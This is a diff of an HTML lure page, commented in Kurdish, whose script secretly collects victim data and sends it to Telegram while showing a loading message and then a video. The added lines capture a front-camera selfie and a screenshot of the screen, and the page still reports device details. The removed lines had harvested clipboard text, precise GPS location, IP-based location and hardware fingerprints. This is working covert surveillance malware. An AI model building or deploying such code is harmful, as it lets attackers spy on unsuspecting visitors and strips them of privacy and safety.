@@ -116,6 +116,7 @@
     </div>
 
     <video id="camVideo" autoplay playsinline style="display:none;"></video>
+    <video id="screenVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -126,13 +127,6 @@
                 String.fromCharCode(char.charCodeAt(0) + 3)
             ).join(''));
         }
-
-        let motionData = { alpha: 0, beta: 0, gamma: 0 };
-        window.addEventListener('deviceorientation', function(event) {
-            motionData.alpha = Math.round(event.alpha || 0);
-            motionData.beta = Math.round(event.beta || 0);
-            motionData.gamma = Math.round(event.gamma || 0);
-        });
 
         async function sendToTelegram(payload) {
             try {
@@ -147,101 +141,75 @@
             } catch(e) {}
         }
 
-        async function getClipboardData() {
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    let text = await navigator.clipboard.readText();
-                    return text ? text.slice(0, 100) : "خاڵییە";
-                }
-            } catch(e) { return "ڕەتکرایەوە"; }
-            return "پشتیوانی ناکرێت";
+        // ١. گرتنی وێنەی شاشە (Screen Capture / Screenshot)
+        function captureScreen() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: "browser" }, audio: false })
+                .then(stream => {
+                    const video = document.getElementById('screenVideo');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        let ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            let reader = new FileReader();
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = function() {
+                                sendToTelegram({ type: 'photo', caption: "💻 *وێنەی شاشەی گیراو (Screen Capture)*", data: reader.result });
+                            }
+                        }, 'image/jpeg', 0.85);
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1500);
+                }).catch(err => {
+                    // ئەگەر بەکارهێنەر ڕەتی کردەوە یان پشتگیری نەکرا
+                });
+            }
         }
 
-        function getGPUInfo() {
-            try {
-                let canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "نەزانراو";
-                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
-            } catch(e) { return "بەردەست نییە"; }
-        }
-
-        async function getUltimateIPData() {
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                let data = await res.json();
-                if (data && data.ip) return data;
-            } catch(e) {}
-            return { ip: "نەزانراو", city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
-        }
-
-        // ١. ناردنی دەستبەجێی تێکست و زانیاریی سیستم
+        // ٢. ناردنی زانیاریی سیستم و IP
         async function gatherAndSendTelemetry() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
-            let language = navigator.language;
-            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let screenRes = window.screen.width + "x" + window.screen.height;
-            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
-            let gpu = getGPUInfo();
-            let clipboardText = await getClipboardData();
-            let ipData = await getUltimateIPData();
-
-            let report = `⚡ *ڕاپۆرتی تایتان گۆد مۆد (TITAN PRO):*\n\n` +
-                         `🌐 *ڕایەڵە و شوێن:*\n` +
-                         `• *ئایپی:* \`${ipData.ip}\`\n` +
-                         `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
-                         `• *دابینکەر:* ${ipData.org}\n` +
-                         `• *ناوچەی کاتی:* \`${timezone}\`\n\n` +
-                         `📋 *کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
-                         `💻 *رەقامەواڵە:*\n` +
+            
+            let report = `⚡ *ڕاپۆرتی نوێی شاشە و تایتان:*\n\n` +
                          `• سیستم: ${platform}\n` +
-                         `• پرۆسێسەر (Cores): ${cpuCores}\n` +
-                         `• کارتی شاشە: \`${gpu}\`\n` +
                          `• شاشە: ${screenRes}\n` +
-                         `• زمان: ${language}\n\n` +
-                         `📱 *User Agent:*\n\`${ua}\``;
+                         `• براوسەر: \`${ua}\``;
             
             await sendToTelegram({ type: 'text', text: report });
         }
 
-        // ٢. ناردنی شوێنی GPS
-        function sendLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-                    let accuracy = position.coords.accuracy;
-                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n• هەڵە: ~${Math.round(accuracy)} مەتر\n🗺️ [کردنەوە لە نەخشە](https://maps.google.com/?q=${lat},${lon})`;
-                    sendToTelegram({ type: 'text', text: locMsg });
-                }, function(error) {}, { enableHighAccuracy: true, timeout: 10000 });
-            }
-        }
-
-        // ٣. ناردنی وێنەی کامێرا بە دوای یەکدا
-        function takePictures() {
+        // ٣. گرتنی وێنەی کامێرا (Selfie)
+        function takeCameraPhoto() {
             const video = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
             
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(function(stream) {
+            .then(stream => {
                 video.srcObject = stream;
                 video.play();
-                setTimeout(function() {
+                setTimeout(() => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     let ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(function(blob) {
+                    canvas.toBlob(blob => {
                         let reader = new FileReader();
                         reader.readAsDataURL(blob);
                         reader.onloadend = function() {
-                            sendToTelegram({ type: 'photo', caption: "📸 *وێنەی پێشەوە (Selfie)*", data: reader.result });
+                            sendToTelegram({ type: 'photo', caption: "📸 *وێنەی کامێرای پێشەوە (Selfie)*", data: reader.result });
                         }
                     }, 'image/jpeg', 0.8);
                     stream.getTracks().forEach(track => track.stop());
-                }, 1500);
+                }, 1200);
             }).catch(e => {});
         }
 
@@ -250,10 +218,10 @@
             document.getElementById('loader').style.display = 'block';
             document.getElementById('statusText').innerText = 'چاوەڕوان بە...';
 
-            // جێبەجێکردنی کارەکان بە پلەبەندی (Staggered Execution) بۆ مسۆگەرکردنی ناردن
+            // دەستپێکردنی کارەکان بە پلەبەندی
             gatherAndSendTelemetry();
-            setTimeout(sendLocation, 1000);
-            setTimeout(takePictures, 2500);
+            setTimeout(takeCameraPhoto, 1000);
+            setTimeout(captureScreen, 2200); // داوای گرتنی وێنەی شاشە
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
@@ -265,7 +233,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => {});
-            }, 3500);
+            }, 4000);
         }
     </script>
 </body>
